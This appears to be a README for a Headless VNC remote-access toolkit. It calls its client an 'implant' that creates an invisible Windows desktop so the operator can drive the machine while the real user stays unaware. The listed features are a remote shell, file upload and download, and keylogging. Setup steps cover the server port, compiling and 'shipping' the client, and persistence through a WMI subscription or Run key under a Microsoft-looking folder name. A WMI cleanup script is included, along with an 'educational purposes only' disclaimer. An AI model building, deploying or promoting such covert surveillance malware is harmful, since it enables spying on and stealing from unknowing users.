# Headless VNC (HVNC) Toolkit

> A **stealth-first** remote-administration framework that spins up an invisible Windows desktop in memory and lets you drive it like a regular VNC session—only without the tell-tale screen flicker or user-side pop-ups.  
> Built for red-team operators who need *eyes-on-glass* access with the subtlety of a ghost.

---

## Repository Layout

| Path     | Role | Notes |
|----------|------|-------|
| **`server/`** | Server-side component | Accepts inbound HVNC tunnels, multiplexes sessions, prints each connection in its own console |
| **`client/`** | Client implant | Creates the hidden desktop, hooks keyboard / mouse, relays frames & input events |

> ⚠️ *Every new connection opens in a **separate console window***—handy for parallel ops and clean log separation.

---

## Supported Commands

| Constant | Action |
|----------|--------|
| `CMD_START_EXPLORER`     | Launch **Windows Explorer** explorer.exe |
| `CMD_START_RUN`          | Open the classic **Run / cmd prompt** cmd.exe |
| `CMD_START_CHROME`       | Launch **Google Chrome** |
| `CMD_START_EDGE`         | Launch **Microsoft Edge** |
| `CMD_START_BRAVE`        | Launch **Brave** |
| `CMD_START_FIREFOX`      | Launch **Mozilla Firefox** |
| `CMD_START_IEXPL`        | Launch **Internet Explorer** |
| `CMD_START_POWERSHELL`   | Open **PowerShell** |
| `CMD_SHELL_OPEN`         | Begin an **interactive remote shell** |
| `CMD_SHELL_COMMAND`      | Send a command to a shell already open |
| `CMD_FILE_LIST`          | Enumerate **files / folders** in a directory |
| `CMD_FILE_DOWNLOAD`      | **Download** a file from the remote box |
| `CMD_FILE_UPLOAD`        | **Upload** a file to the remote box |
| `CMD_KEYLOGGER_START`    | Start keylogging |
| `CMD_KEYLOGGER_STOP`     | Stop keylogging |

---

## Getting Started

1. **Server**

   ```
   cd server
   python server.py
   The script will prompt for a listening port  use the same port as the client build.
   ```

2. **Client**

   *Edit* `client/main.cpp` – set:

   ```cpp
   constexpr auto HOST = "YOUR_SERVER_IP";
   constexpr uint16_t PORT = 4444;  // same as the server prompt
   ```

   Then compile, ship, and run.
   On first launch, the implant copies itself to:

   ```
   %LOCALAPPDATA%\Microsoft\Win32Components\
   ```

   and auto-starts at logon:

   * Admin → WMI subscription
   * Standard user → Run registry key

---

## Testing & Cleanup

Need a sterile host after the demo? Use the included PowerShell helper:

```
Remove artifacts, folders, autoruns
client\clean.ps1
```

### Manual WMI Check / Removal

```
Get-WmiObject -Namespace root\subscription -Class __EventFilter `
  -Filter "Name='Microsoft_Win32Filter'" | ForEach-Object { $_.Delete() }

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer `
  -Filter "Name='Microsoft_Win32Consumer'" | ForEach-Object { $_.Delete() }

Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding `
  | Where-Object { $_.Consumer -match 'Microsoft_Win32Consumer' } `
  | ForEach-Object { $_.Delete() }
```

Verify all gone:

```
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding `
  | Where-Object { $_.Consumer -match 'Microsoft_Win32Consumer' } `
  | Format-List Filter, Consumer
```

---

## Why HVNC?

Traditional VNC mirrors the users active desktop—any mouse wiggle or window pop-up is visible. Headless VNC instead:

1. Creates a brand new, invisible desktop WinSta0\HVNC in memory.
2. Runs spawned processes inside that hidden session completely off-screen.
3. Streams the pixels or GDI diffs back to the operator with negligible latency.
4. Leaves the real user blissfully unaware—no taskbar flashes, no window focus steals.

In short: you get a **full UI foothold** with the stealth of a backdoor shell.

---

## OPSEC Highlights

* **Console-per-session** → easy kill-switch & minimal cross-noise.
* **Auto-persistence** adapts to privilege level WMI vs. registry.
* **Keylogger** runs in-process no DLL drop on disk.
* **WMI cleanup script** shipped for safe red-team eject.

Yes, theres more on the roadmap: TLS tunneling, clipboard sync, multi-monitor capture watch the commits!

---

## 🚫 Disclaimer

This repository is provided for **educational purposes only** and intended for **authorized security research**.
Any **unauthorized use**—including but not limited to illicit surveillance, system compromise, or privacy invasion—is **strictly prohibited**.


